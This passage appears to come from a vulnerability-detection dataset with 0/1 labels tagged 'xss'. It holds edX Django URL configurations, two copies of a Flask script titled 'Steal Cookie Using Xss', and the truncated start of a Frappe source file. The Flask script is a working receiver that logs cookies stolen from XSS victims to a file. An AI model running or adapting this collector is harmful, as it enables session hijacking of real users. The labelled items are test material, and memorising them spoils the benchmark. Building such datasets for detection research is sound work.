name=\"masquerade-switch\"),\n        )\n\n    # discussion forums live within courseware, so courseware must be enabled first\n    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',\n                'courseware.views.news', name=\"news\"),\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',\n                include('django_comment_client.urls'))\n        )\n    urlpatterns += (\n        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',\n        'courseware.views.static_tab', name=\"static_tab\"),\n    )\n\n    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',\n                'courseware.views.submission_history',\n                name='submission_history'),\n        )\n\n\nif settings.ENABLE_JASMINE:\n    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)\n\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    ## Jasmine and admin\n    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID'):\n    urlpatterns += (\n        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),\n        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),\n        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),\n    )\n\nif settings.MITX_FEATURES.get('AUTH_USE_SHIB'):\n    urlpatterns += (\n        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),\n    )\n\nif settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):\n    urlpatterns += (\n        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_login', name='course-specific-login'),\n        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_register', name='course-specific-register'),\n\n    )\n\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):\n    urlpatterns += (\n        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),\n        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),\n        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),\n        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):\n    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),\n\nif settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):\n    urlpatterns += (\n        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),\n        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):\n    urlpatterns += (\n        url(r'^event_logs$', 'track.views.view_tracking_log'),\n        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):\n    urlpatterns += (\n        url(r'^status/', include('service_status.urls')),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):\n    urlpatterns += (\n        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),\n    )\n\nif settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):\n    urlpatterns += (\n        url(r'^edinsights_service/', include('edinsights.core.urls')),\n    )\n    import edinsights.core.registry\n\n# FoldIt views\nurlpatterns += (\n    # The path is hardcoded into their app...\n    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"),\n)\n\nif settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):\n    urlpatterns += (\n        url(r'^debug/run_python', 'debug.views.run_python'),\n    )\n\n# Crowdsourced hinting instructor manager.\nif settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',\n            'instructor.hint_manager.hint_manager', name=\"hint_manager\"),\n    )\n\nurlpatterns = patterns(*urlpatterns)\n\nif settings.DEBUG:\n    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)\n\n#Custom error pages\nhandler404 = 'static_template_view.views.render_404'\nhandler500 = 'static_template_view.views.render_500'\n/n/n/n", "label": 0, "vtype": "xss"}, {"id": "5fad9ccca43cdfb565b3f80914f998afa7f2fa78", "code": "/lms/urls.py/n/nfrom django.conf import settings\nfrom django.conf.urls import patterns, include, url\nfrom django.contrib import admin\nfrom django.conf.urls.static import static\n\n# Not used, the work is done in the imported module.\nfrom . import one_time_startup      # pylint: disable=W0611\n\nimport django.contrib.auth.views\n\n# Uncomment the next two lines to enable the admin:\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    admin.autodiscover()\n\nurlpatterns = ('',  # nopep8\n    # certificate view\n\n    url(r'^update_certificate$', 'certificates.views.update_certificate'),\n    url(r'^$', 'branding.views.index', name=\"root\"),   # Main marketing page, or redirect to courseware\n    url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"),\n    url(r'^login$', 'student.views.signin_user', name=\"signin_user\"),\n    url(r'^register$', 'student.views.register_user', name=\"register_user\"),\n\n    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),\n\n    url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"),\n    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),\n    url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"),\n    url(r'^accept_name_change$', 'student.views.accept_name_change'),\n    url(r'^reject_name_change$', 'student.views.reject_name_change'),\n    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),\n    url(r'^event$', 'track.views.user_track'),\n    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?\n\n    url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"),\n\n    url(r'^login_ajax$', 'student.views.login_user', name=\"login\"),\n    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),\n    url(r'^logout$', 'student.views.logout_user', name='logout'),\n    url(r'^create_account$', 'student.views.create_account', name='create_account'),\n    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"),\n\n    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"),\n    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),\n\n    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),\n    ## Obsolete Django views for password resets\n    ## TODO: Replace with Mako-ized views\n    url(r'^password_change/$', django.contrib.auth.views.password_change,\n        name='auth_password_change'),\n    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,\n        name='auth_password_change_done'),\n    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',\n        'student.views.password_reset_confirm_wrapper',\n        name='auth_password_reset_confirm'),\n    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,\n        name='auth_password_reset_complete'),\n    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,\n        name='auth_password_reset_done'),\n\n    url(r'^heartbeat$', include('heartbeat.urls')),\n)\n\n# University profiles only make sense in the default edX context\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        ##\n        ## Only universities without courses should be included here.  If\n        ## courses exist, the dynamic profile rule below should win.\n        ##\n        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}),\n        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}),\n        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}),\n        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}),\n        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}),\n        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}),\n\n        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',\n            name=\"university_profile\"),\n    )\n\n#Semi-static views (these need to be rendered and have the login bar, but don't change)\nurlpatterns += (\n    url(r'^404$', 'static_template_view.views.render',\n        {'template': '404.html'}, name=\"404\"),\n)\n\n# Semi-static views only used by edX, not by themes\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        url(r'^jobs$', 'static_template_view.views.render',\n            {'template': 'jobs.html'}, name=\"jobs\"),\n        url(r'^press$', 'student.views.press', name=\"press\"),\n        url(r'^media-kit$', 'static_template_view.views.render',\n            {'template': 'media-kit.html'}, name=\"media-kit\"),\n        url(r'^faq$', 'static_template_view.views.render',\n            {'template': 'faq.html'}, name=\"faq_edx\"),\n        url(r'^help$', 'static_template_view.views.render',\n            {'template': 'help.html'}, name=\"help_edx\"),\n\n        # TODO: (bridger) The copyright has been removed until it is updated for edX\n        # url(r'^copyright$', 'static_template_view.views.render',\n        #     {'template': 'copyright.html'}, name=\"copyright\"),\n\n        #Press releases\n        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),\n\n        # Favicon\n        (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),\n\n        url(r'^submit_feedback$', 'util.views.submit_feedback'),\n\n    )\n\n# Only enable URLs for those marketing links actually enabled in the\n# settings. Disable URLs by marking them as None.\nfor key, value in settings.MKTG_URL_LINK_MAP.items():\n    # Skip disabled URLs\n    if value is None:\n        continue\n\n    # These urls are enabled separately\n    if key == \"ROOT\" or key == \"COURSES\" or key == \"FAQ\":\n        continue\n\n    # Make the assumptions that the templates are all in the same dir\n    # and that they all match the name of the key (plus extension)\n    template = \"%s.html\" % key.lower()\n\n    # To allow theme templates to inherit from default templates,\n    # prepend a standard prefix\n    if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n        template = \"theme-\" + template\n\n    # Make the assumption that the URL we want is the lowercased\n    # version of the map key\n    urlpatterns += (url(r'^%s' % key.lower(),\n                        'static_template_view.views.render',\n                        {'template': template}, name=value),)\n\n\nif settings.PERFSTATS:\n    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)\n\n# Multicourse wiki (Note: wiki urls must be above the courseware ones because of\n# the custom tab catch-all)\nif settings.WIKI_ENABLED:\n    from wiki.urls import get_pattern as wiki_pattern\n    from django_notify.urls import get_pattern as notify_pattern\n\n    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update\n    # them together.\n    urlpatterns += (\n        # First we include views from course_wiki that we use to override the default views.\n        # They come first in the urlpatterns so they get resolved first\n        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),\n        url(r'^wiki/', include(wiki_pattern())),\n        url(r'^notify/', include(notify_pattern())),\n\n        # These urls are for viewing the wiki in the context of a course. They should\n        # never be returned by a reverse() so they come after the other url patterns\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',\n            'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"),\n        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),\n    )\n\n\nif settings.COURSEWARE_ENABLED:\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',\n            'courseware.views.jump_to', name=\"jump_to\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.modx_dispatch',\n            name='modx_dispatch'),\n\n\n        # Software Licenses\n\n        # TODO: for now, this is the endpoint of an ajax replay\n        # service that retrieve and assigns license numbers for\n        # software assigned to a course. The numbers have to be loaded\n        # into the database.\n        url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.xqueue_callback',\n            name='xqueue_callback'),\n        url(r'^change_setting$', 'student.views.change_setting',\n            name='change_setting'),\n\n        # TODO: These views need to be updated before they work\n        url(r'^calculate$', 'util.views.calculate'),\n        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki\n        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),\n        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),\n\n        url(r'^courses/?$', 'branding.views.courses', name=\"courses\"),\n        url(r'^change_enrollment$',\n            'student.views.change_enrollment', name=\"change_enrollment\"),\n\n        #About the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',\n            'courseware.views.course_about', name=\"about_course\"),\n        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n        #View for mktg site\n        url(r'^mktg/(?P<course_id>.*)$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n\n\n\n        #Inside the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'courseware.views.course_info', name=\"course_root\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',\n            'courseware.views.course_info', name=\"info\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n            'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n            'staticbook.views.index', name=\"book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n            'courseware.views.index', name=\"courseware\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_chapter\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_section\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',\n            'courseware.views.index', name=\"courseware_position\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',\n            'courseware.views.progress', name=\"progress\"),\n        # Takes optional student_id for instructor use--shows profile as that student sees it.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',\n            'courseware.views.progress', name=\"student_progress\"),\n\n        # For the instructor\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',\n            'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',\n            'instructor.views.gradebook', name='gradebook'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',\n            'instructor.views.grade_summary', name='grade_summary'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',\n            'open_ended_grading.views.staff_grading', name='staff_grading'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',\n            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',\n            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),\n\n        # Open Ended problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',\n            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),\n\n        # Open Ended flagged problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',\n            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',\n            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),\n\n        # Cohorts management\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',\n            'course_groups.views.list_cohorts', name=\"cohorts\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',\n            'course_groups.views.add_cohort',\n            name=\"add_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',\n            'course_groups.views.users_in_cohort',\n            name=\"list_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',\n            'course_groups.views.add_users_to_cohort',\n            name=\"add_to_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',\n            'course_groups.views.remove_user_from_cohort',\n            name=\"remove_from_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',\n            'course_groups.views.debug_cohort_mgmt',\n            name=\"debug_cohort_mgmt\"),\n\n        # Open Ended Notifications\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',\n            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',\n            'open_ended_grading.views.peer_grading', name='peer_grading'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),\n\n    )\n\n    # allow course staff to change to student view of courseware\n    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):\n        urlpatterns += (\n            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"),\n        )\n\n    # discussion forums live within courseware, so courseware must be enabled first\n    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',\n                'courseware.views.news', name=\"news\"),\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',\n                include('django_comment_client.urls'))\n        )\n    urlpatterns += (\n        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',\n        'courseware.views.static_tab', name=\"static_tab\"),\n    )\n\n    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',\n                'courseware.views.submission_history',\n                name='submission_history'),\n        )\n\n\nif settings.ENABLE_JASMINE:\n    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)\n\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    ## Jasmine and admin\n    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID'):\n    urlpatterns += (\n        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),\n        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),\n        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),\n    )\n\nif settings.MITX_FEATURES.get('AUTH_USE_SHIB'):\n    urlpatterns += (\n        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),\n    )\n\nif settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):\n    urlpatterns += (\n        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_login', name='course-specific-login'),\n        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_register', name='course-specific-register'),\n\n    )\n\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):\n    urlpatterns += (\n        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),\n        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),\n        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),\n        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):\n    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),\n\nif settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):\n    urlpatterns += (\n        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),\n        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):\n    urlpatterns += (\n        url(r'^event_logs$', 'track.views.view_tracking_log'),\n        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):\n    urlpatterns += (\n        url(r'^status/', include('service_status.urls')),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):\n    urlpatterns += (\n        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),\n    )\n\nif settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):\n    urlpatterns += (\n        url(r'^edinsights_service/', include('edinsights.core.urls')),\n    )\n    import edinsights.core.registry\n\n# FoldIt views\nurlpatterns += (\n    # The path is hardcoded into their app...\n    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"),\n)\n\nif settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):\n    urlpatterns += (\n        url(r'^debug/run_python', 'debug.views.run_python'),\n    )\n\n# Crowdsourced hinting instructor manager.\nif settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',\n            'instructor.hint_manager.hint_manager', name=\"hint_manager\"),\n    )\n\nurlpatterns = patterns(*urlpatterns)\n\nif settings.DEBUG:\n    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)\n\n#Custom error pages\nhandler404 = 'static_template_view.views.render_404'\nhandler500 = 'static_template_view.views.render_500'\n/n/n/n", "label": 1, "vtype": "xss"}, {"id": "33993d2dca4259e574211b8fa84032894b278bb0", "code": "xss.py/n/nfrom flask import Flask,request\nfrom termcolor import colored\nfrom time import sleep\nprint ('\\n\\t[ Steal Cookie Using Xss .. ]\\n')\nprint(colored('\\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\\n\\n')\nsleep(2)\napp = Flask(__name__)\n@app.route('/')\ndef index():\n\treturn 'Hello ^_^'\n@app.route('/cookie',methods=['GET','POST'])\ndef steal():\n\tif request.method == \"GET\" or request.method == \"POST\":\n\t\tdata = request.values\n\t\tcookie = data.get('cookie')\n\t\twith open('cookies.txt',mode='a') as f:\n\t\t\tf.write('\\n---------------------------\\n'+cookie+'\\n---------------------------\\n')\n\t\tprint(colored('\\n\\n[+] ','green')+'New Cookie ..\\n\\n')\n\t\treturn 'Thanks :)'\nif __name__ == '__main__':\n\tapp.run()\n/n/n/n", "label": 0, "vtype": "xss"}, {"id": "33993d2dca4259e574211b8fa84032894b278bb0", "code": "/xss.py/n/nfrom flask import Flask,request\nfrom termcolor import colored\nfrom time import sleep\nprint ('\\n\\t[ Steal Cookie Using Xss .. ]\\n\\n')\nprint(colored('\\n\\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\\n\\n')\nsleep(2)\napp = Flask(__name__)\n@app.route('/')\ndef index():\n\treturn 'Hello ^_^'\n@app.route('/cookie',methods=['GET','POST'])\ndef steal():\n\tif request.method == \"GET\" or request.method == \"POST\":\n\t\tdata = request.values\n\t\tcookie = data.get('cookie')\n\t\twith open('cookies.txt',mode='a') as f:\n\t\t\tf.write('\\n---------------------------\\n'+cookie+'\\n---------------------------\\n')\n\t\tprint(colored('\\n\\n[+] ','green')+'New Cookie ..\\n\\n')\n\t\treturn 'Thanks :)'\nif __name__ == '__main__':\n\tapp.run()\n/n/n/n", "label": 1, "vtype": "xss"}, {"id": "acd2f589b6cd2d1011be4a4e4965a1b3ed489c37", "code": "frappe/core/doctype/doctype/doctype.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\n\nimport six\n\nimport re, copy, os, subprocess\nimport frappe\nfrom frappe import _\n\nfrom frappe.utils import now, cint\nfrom frappe.model import no_value_fields, default_fields\nfrom frappe.model.document import Document\nfrom frappe.custom.doctype.property_setter.property_setter import make_property_setter\nfrom frappe.desk.notifications import delete_notification_count_for\nfrom frappe.modules import make_boilerplate, get_doc_path\nfrom frappe.model.db_schema import validate_column_name, validate_column_length, type_map\nfrom frappe.model.docfield import supports_translation\nimport frappe.website.render\n\n# imports - third-party imports\nimport pymysql\nfrom pymysql.constants import ER\n\nclass InvalidFieldNameError(frappe.ValidationError): pass\nclass UniqueFieldnameError(frappe.ValidationError): pass\nclass IllegalMandatoryError(frappe.ValidationError): pass\nclass DoctypeLinkError(frappe.ValidationError): pass\nclass WrongOptionsDoctypeLinkError(frappe.ValidationError): pass\nclass 